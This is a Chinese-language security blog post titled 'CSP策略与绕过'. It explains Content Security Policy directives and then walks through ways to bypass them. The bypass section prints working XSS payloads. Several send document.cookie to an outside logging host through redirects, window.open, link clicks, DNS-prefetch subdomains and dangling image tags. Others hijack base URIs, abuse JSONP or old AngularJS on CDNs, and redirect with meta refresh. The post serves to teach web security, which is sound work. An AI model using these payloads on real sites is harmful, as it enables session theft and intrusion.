@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        CSP策略与绕过 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">CSP策略与绕过</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv3</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-24 16:27:21
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CSP/">CSP</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="CSP策略与绕过"><a href="#CSP策略与绕过" class="headerlink" title="CSP策略与绕过"></a>CSP策略与绕过</h1><p>之前在同源策略中提到过CSP，也就是内容安全策略。CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。合理地配置好CSP能够避免绝大部分的XSS攻击。</p>
+<h2 id="CSP的引入方式"><a href="#CSP的引入方式" class="headerlink" title="CSP的引入方式"></a>CSP的引入方式</h2><p>有两种方式启用CSP：</p>
+<ol>
+<li>通过HTTP头部得<code>Content-Security-Policy</code>字段</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span>; <span class="keyword">object</span>-src <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>通过HTML标签<code>&lt;meta&gt;</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="CSP常用指令"><a href="#CSP常用指令" class="headerlink" title="CSP常用指令"></a>CSP常用指令</h2><p>CSP会限制以下资源的加载：</p>
+<ul>
+<li><strong>child-src</strong>：指定定义了 web workers 以及嵌套的浏览上下文（如<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>）的源</li>
+<li><strong>connect-src</strong>：限制能通过脚本接口加载的URL。</li>
+<li><strong>font-src</strong> ：定义了字体加载的有效来源</li>
+<li><strong>img-src</strong> ：定义了图片或者图标加载的有效来源</li>
+<li><strong>media-src</strong>： 定义了媒体文件加载的有效来源如HTML6的 <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>等元素</li>
+<li><strong>object-src</strong>：限制<code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>或者<code>&lt;applet&gt;</code>标签的源地址。</li>
+<li><strong>style-src</strong> ：定义页面中CSS样式的有效来源</li>
+<li><strong>script-src</strong> ：定义页面中javascript有效来源</li>
+<li><strong>worker-src</strong>：限制Worker、SharedWorker或者ServiceWorker脚本源。</li>
+<li>**manifest-src **： 限制应用声明文件的源地址。</li>
+<li><strong>frame-src：</strong> 设置允许通过类似<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>标签加载的内嵌内容的源地址。</li>
+<li><strong>default-src</strong>：定义了那些没有被更精确指令指定的安全策略。</li>
+</ul>
+<blockquote>
+<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
+</blockquote>
+<h2 id="选项值"><a href="#选项值" class="headerlink" title="选项值"></a>选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
+<ul>
+<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
+<li>路径名：<code>example.org/resources/js/</code></li>
+<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
+<li>协议名：<code>https:</code>、<code>data:</code></li>
+<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
+<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
+</ul>
+<p>多个值也可以并列，用空格分隔。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span> https:<span class="comment">//apis.google.com</span></span><br></pre></td></tr></table></figure>
+<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误的写法</span></span><br><span class="line">script-src https:<span class="comment">//host1.com; script-src https://host2.com</span></span><br><span class="line"><span class="comment"># 正确的写法</span></span><br><span class="line">script-src https:<span class="comment">//host1.com https://host2.com</span></span><br></pre></td></tr></table></figure>
+<p>如果不设置某个限制选项，就是默认允许任何值。</p>
+<h3 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a>script-src 的特殊值</h3><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
+<ul>
+<li>**<code>&#39;unsafe-inline&#39;</code>**：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li>
+<li><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
+<li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行。但是这个随机字符串，应当是唯一，不应该是写死的。如果是固定的nonce值，那么nonce没有任何意义，因为攻击者可以将自己注入的script标签也添加上相同的nonce值。</li>
+</ul>
+<p>example：服务器发送网页的时候，告诉浏览器一个随机生成的token</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>页面内嵌脚本，必须有这个token才能执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">EDNnf03nceIOfn39fn3e9h3sdfa</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// some code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
+</ul>
+<p>example:服务器给出一个允许执行的代码的hash值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>下面的代码就会允许执行，因为hash值相符。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Hello, world.&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。</p>
+<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
+<h2 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h2><h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>当URL允许<code>script-src &#39;unsafe-inline&#39;</code>时，可以执行脚本但是由于CSP无法将数据发送出去，这时候可以利用<code>window.open</code>、<code>location</code>、<code>&lt;a&gt;</code>跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src &#x27;self&#x27; ;script-src &#x27;unsafe-inline&#x27;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://t6n089.ceye.io/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href = <span class="string">&#x27;http://t6n089.ceye.io/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> a=<span class="built_in">document</span>.createElement(<span class="string">&quot;a&quot;</span>);a.href=<span class="string">&#x27;http://t6n089.ceye.io/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);a.click();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210322214824468.png" alt="image-20210322214824468"></p>
+<h3 id="DNS预加载"><a href="#DNS预加载" class="headerlink" title="DNS预加载"></a>DNS预加载</h3><p>一般来说，<code>self</code>代表只接受符合同源策略的URL，这样一来，大部分的XSS和CSRF都会失效。但<code>&lt;link&gt;</code>标签除外。我们可以通过<code>&lt;link&gt;</code>标签绕过CSP。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:<span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> ;script-src <span class="string">&#x27;unsafe-inline&#x27;</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;body&#x27;</span>).innerHTML=<span class="string">&quot;&lt;link rel=&#x27;dns-prefetch&#x27; href=&#x27;http://&quot;</span>+<span class="built_in">document</span>.cookie.split(<span class="regexp">/;|=/</span>)[<span class="number">0</span>].trim()+<span class="string">&quot;.t6n089.ceye.io&#x27;&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>这样，我们可以通过预加载，将数据添加到<code>&lt;link&gt;</code>标签的DNS预解析的子域名中，从DNS记录中拿到数据。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210318163559401.png" alt="image-20210318163559401"></p>
+<h3 id="Iframe"><a href="#Iframe" class="headerlink" title="Iframe"></a>Iframe</h3><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建<code>&lt;iframe&gt;</code>用JavaScript直接操作A页面的DOM，可以说A页面的CSP防护完全失效。</p>
+<p>A页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>B页面:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">&quot;A页面&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210322220648702.png" alt="image-20210322220648702"></p>
+<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>一般站点都会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险。</p>
+<p>这里给出orange师傅绕hackmd CSP的文章<a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/855/" >Hackmd XSS<i class="fas fa-external-link-alt"></i></a></p>
+<p>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://cdnjs.cloudflare.com;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323113111535.png" alt="image-20210323113111535"></p>
+<h3 id="站点可控静态资源"><a href="#站点可控静态资源" class="headerlink" title="站点可控静态资源"></a>站点可控静态资源</h3><p>给一个绕过codimd的(实例)<a class="link"   target="_blank" rel="noopener" href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" >codimd xss<i class="fas fa-external-link-alt"></i></a></p>
+<p>当网站允许 <code>unsafe-eva</code>l 且允许<code>google-analytics</code>谷歌分析站点的JS加载时，我们可以利用Google Tag Manager 自定义JS，生成一个自定义JavaScript内容的<code>google-analytics</code>的链接。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323110922893.png" alt="image-20210323110922893"></p>
+<h3 id="站点可控JSONP"><a href="#站点可控JSONP" class="headerlink" title="站点可控JSONP"></a>站点可控JSONP</h3><p>大部分站点的jsonp是完全可控的，只不过有些站点会让JSONP不返回HTML类型防止直接的反射型XSS，但是如果将URL插入到<code>&lt;script&gt;</code>标签中，除非设置<code>x-content-type-options</code>头，否者尽管返回类型不一致，浏览器依旧会当成JS进行解析。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src https://www.google.com&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323112718427.png" alt="image-20210323112718427"></p>
+<p>下面是一些存在用户可控资源或者jsonp比较常用站点的github项目：<a class="link"   target="_blank" rel="noopener" href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt" >https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Base-uri"><a href="#Base-uri" class="headerlink" title="Base-uri"></a>Base-uri</h3><p>当服务器CSP <code>script-src</code>采用了<code>nonce</code>时，如果只设置了default-src没有额外设置<code>base-uri</code>，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法<code>&lt;script&gt;</code>标签采用了相对路径，那么最终加载的JS就是针对<code>&lt;base&gt;</code>标签中指定URL的相对路径。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.91.140&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323115106369.png" alt="image-20210323115106369"></p>
+<h3 id="利用浏览器自动补全"><a href="#利用浏览器自动补全" class="headerlink" title="利用浏览器自动补全"></a>利用浏览器自动补全</h3><ul>
+<li>情形一</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    header(&quot;X-XSS-Protection:0&quot;);</span><br><span class="line">    header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;nonce-xxxxx&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    echo $_GET[&#39;xss&#39;]；</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script nonce&#x3D;&#39;xxxxx&#39;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>如上这种情况， 注入点在<code>&lt;script&gt;</code> 标签的正上方，可以输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;data:text&#x2F;plain,alert(1)</span><br></pre></td></tr></table></figure>
+<p>利用浏览器的自动补全,<code>&lt;script</code> 会变成一个属性，后面的nonce属性也被保留下来，所以绕过了nonce。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323120414445.png" alt="image-20210323120414445"></p>
+<p>这里在chrome浏览器失效，但是在火狐浏览器可以。</p>
+<ul>
+<li>情形二</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    header(&quot;X-XSS-Protection:0&quot;);</span><br><span class="line">    header(&quot;Content-Security-Policy: default-src &#39;self&#39;;script-src &#39;self&#39;; img-src *;&quot;);</span><br><span class="line"></span><br><span class="line">    echo $_GET[&#39;xss&#39;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1&gt;flag&#123;0xffff&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2 id&#x3D;&quot;id&quot;&gt;3&lt;&#x2F;h2&gt;</span><br></pre></td></tr></table></figure>
+<p>如下这种情况，注入点在需要带出的数据上方。我们的目标是拿到注入点下方一个标签的数据。可以看到，前提<code>&lt;img&gt;</code>标签是允许加载跨域的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;t6n089.ceye.io?a&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210323145513874.png" alt="image-20210323145513874"></p>
+<p>这里仍然是chrome无效，火狐有效</p>
+<h3 id="meta网页跳转"><a href="#meta网页跳转" class="headerlink" title="meta网页跳转"></a>meta网页跳转</h3><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;nonce-test&#x27;</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1;url=http://x.x.x.x/&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="object-src（PDFXSS）"><a href="#object-src（PDFXSS）" class="headerlink" title="object-src（PDFXSS）"></a>object-src（PDFXSS）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br></pre></td></tr></table></figure>
+<p>在CSP标准里面，有一个属性是<code>object-src</code>，它限制的是<code>&lt;embed&gt; </code>、<code>&lt;object&gt;</code> 、<code>&lt;applet&gt;</code>标签的src，也就是插件的src，于是我们可以通过插件来执行JavaScript代码，插件的JS代码并不受<code>script-src</code>的约束。PDF文件中允许执行javascript脚本，但是之前浏览器的PDF解析器并不会解析PDF中的JS，但是之前chrome的一次更新中突然允许加载PDF的JavaScript脚本。</p>
